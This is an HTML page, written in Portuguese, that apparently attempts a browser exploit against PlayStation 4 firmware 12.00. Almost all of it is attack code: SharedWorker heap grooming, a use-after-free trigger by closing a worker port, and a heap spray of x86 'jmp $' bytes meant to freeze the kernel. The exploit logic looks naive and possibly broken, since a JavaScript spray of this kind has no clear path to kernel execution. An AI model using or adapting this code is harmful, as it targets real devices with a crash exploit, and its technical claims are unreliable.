<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - Infinite Loop Test</title>
    
</head>
<body>

    <h1>TESTE FINAL: CONGELAMENTO</h1>
    <h3>Se a tela travar e o console NÃO desligar: SUCESSO.</h3>
    <br><br>
    <button onclick="run_freeze()">CONGELAR KERNEL</button>

    <script>
        // Payload: JMP $ (Pula para si mesmo) -> EB FE
        // Se o kernel executar isso, ele trava a CPU para sempre.
        var infinite_loop = [0xEB, 0xFE]; 

        function build_payload() {
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);
            
            // Enchemos o objeto com o comando "Travamento Eterno"
            // Repetimos o padrão EB FE EB FE ... (0xFEEBFEEB)
            buffer.fill(0xFEEBFEEB); 
            
            return buffer;
        }

        var workers = [];

        async function run_freeze() {
            var payload = build_payload();
            
            // 1. Grooming
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // 2. Trigger
            var count = 0;
            var it = setInterval(() => {
                if(count >= 4) {
                    clearInterval(it);
                    
                    // MOMENTO DA VERDADE
                    var v = workers.pop();
                    v.port.close();
                    
                    // Spray Imediato
                    var spray = [];
                    for(var i=0; i<10000; i++) {
                        spray.push(new Uint32Array(payload));
                    }
                    
                    // Force Execution
                    try { v.port.postMessage("DIE"); } catch(e){}
                    
                    alert("Se você conseguir ler isso e o console não travou, falhou.\nSe o mouse parou e a música continua (ou parou): SUCESSO!");
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+count);
                w.port.start();
                workers.push(w);
                count++;
            }, 150);
        }
    </script>
</body>
</html>
